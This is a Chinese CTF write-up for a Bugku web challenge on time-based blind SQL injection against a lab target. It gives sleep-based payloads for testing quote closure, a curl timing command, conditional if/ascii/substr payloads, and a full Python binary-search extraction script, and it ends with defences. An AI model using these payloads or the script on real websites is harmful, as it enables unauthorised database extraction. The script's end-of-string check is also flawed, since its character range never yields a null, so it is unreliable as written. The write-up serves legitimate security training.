Web 时间盲注 Python

Bugku 秋名山车神：写脚本跑时间盲注

2026-10-29 · 约 10 分钟 · Bugku CTF

页面什么也不回显，没有报错，只有响应快慢的区别。这种题手工是做不完的，只能把判断交给脚本 —— 顺便治好了我的急性子。

题目信息

平台Bugku CTF
类型Web / 时间盲注
知识点sleep、if 条件、二分法、requests

什么也不回显

页面只有一个输入框，提交后永远显示「查询失败」，不管输入什么。没有报错信息，也没有数据，union 试了几个都塞不进去。这种页面最容易让人放弃，但先别急 —— 回显可以没有，响应时间却一定存在。

我的习惯是先确认「服务端有没有执行我的输入」：输入一个会拖慢查询的表达式，如果页面变慢，通道就成立。顺便对比一下布尔盲注：如果页面有「成功/失败」两种明显不同的回显，可以直接拿它当通道，一秒能跑十几个字符，比时间盲注快一个数量级。这题连这种差异都没有，只能退到时间。做题时先找最快的通道，再退而求其次，别一上来就写 sleep。

手工验证 sleep(3)

先猜闭合方式。用最笨的办法，把三种常见的都试一遍：

1 and sleep(3)
1' and sleep(3) -- 
1" and sleep(3) --

用 curl 的 -w 参数看耗时，或者在 Burp 里看 Response received 的时间。如果只有某一种闭合方式让响应稳定慢 3 秒，说明注入点成立，而且这条通道是「时间」。

time curl -s "http://靶机/?id=1'%20and%20sleep(3)%20--%20" -o /dev/null

注意 URL 里的空格要编码成 %20，-- 后面的空格也不能丢，否则注释不成立，语句直接报错。

把时间变成布尔通道

sleep 只能回答「是」。要逐位取字符，得让它变成条件判断：

1' and if(ascii(substr(database(),1,1))>100,sleep(2),0) --

意思是：取当前库名第 1 个字符的 ASCII 码，如果大于 100 就睡 2 秒，否则立刻返回。响应慢等于条件为真，响应快等于条件为假。一次请求只回答一个是非题，用二分法 7 次左右就能确定一个字节，比线性猜快得多。

验证条件好不好用，有个笨办法：先不猜字符，直接发 if(1=1,sleep(2),0) 和 if(1=2,sleep(2),0)，看两次的时间差是否明显。差得出来，二分才有意义；差不出来，先把 sleep 调大，或者换个网络环境再说。

这里有个细节：substr 的位置从 1 开始，不是 0；ascii 对中文会返回多字节，所以库名是英文时最好跑。

Python 脚本：二分法逐位取字符

把上面的判断封装成函数，外层套二分查找：

import requests, time

URL = "http://靶机/"
DELAY = 2
THRESH = 1.6

def cond(payload):
    t = time.time()
    try:
        requests.get(URL, params={"id": payload}, timeout=DELAY + 3)
    except requests.exceptions.Timeout:
        return True
    return time.time() - t > THRESH

def get_char(sql, pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        p = ("1' and if(ascii(substr((%s),%d,1))>%d,sleep(%d),0) -- "
             % (sql, pos, mid, DELAY))
        if cond(p):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def dump(sql, n=32):
    out = ""
    for i in range(1, n + 1):
        c = get_char(sql, i)
        if c == "\x00":
            break
        out += c
        print(out, flush=True)
    return out

print(dump("select database()"))

几个关键参数：THRESH 要小于 sleep 时间、大于正常响应时间；网络抖动大的话多测几次取中位数；每个字符都必须重新计时，不要复用上一次的结果。跑通库名之后，把 sql 换成查表名、列名、字段值，同一个脚本能一直用下去。

实际做法是分三段跑：先 select database()，再查 information_schema.tables 拿表名，最后查列名和那几个字段。字段值可能很长，脚本里用 substring 分段取，遇到空字符就停，别硬编码长度。

耐心、限速与踩坑

  • 一开始 THRESH 设成 1 秒，网络一抖就误判，跑出来的库名是乱码；
  • 忘了给 timeout 留余量，requests 在 sleep 期间自己先超时了，全部判真；
  • 一个 20 位的库名要好几分钟，先跑通短的，再查长的；
  • 请求之间加 0.1 秒间隔，练习环境也别打崩。

为什么它慢却通用

时间盲注不依赖回显、不依赖报错，只要 SQL 被执行就有通道，所以在「什么都没有」的场景下几乎总能打通。代价是慢，而且受网络影响，脚本的阈值要调。防御上，参数化查询依然是从根上解决；此外给数据库账号限权、给接口限速、把错误页和响应耗时抹平（统一超时、统一提示），都能让这条通道变得不可用，或者代价高到不值得。

这题还让我第一次认真写了「可复用的脚本」而不是一次性 payload —— 后来做别的盲注题，改两行就能跑，省下来的时间比省下的手速多得多。

最后提一句：时间盲注的流量特征很明显，sleep 会让请求耗时异常拉长。真实环境里的 WAF 和监控，经常就是靠这个特征抓人的。
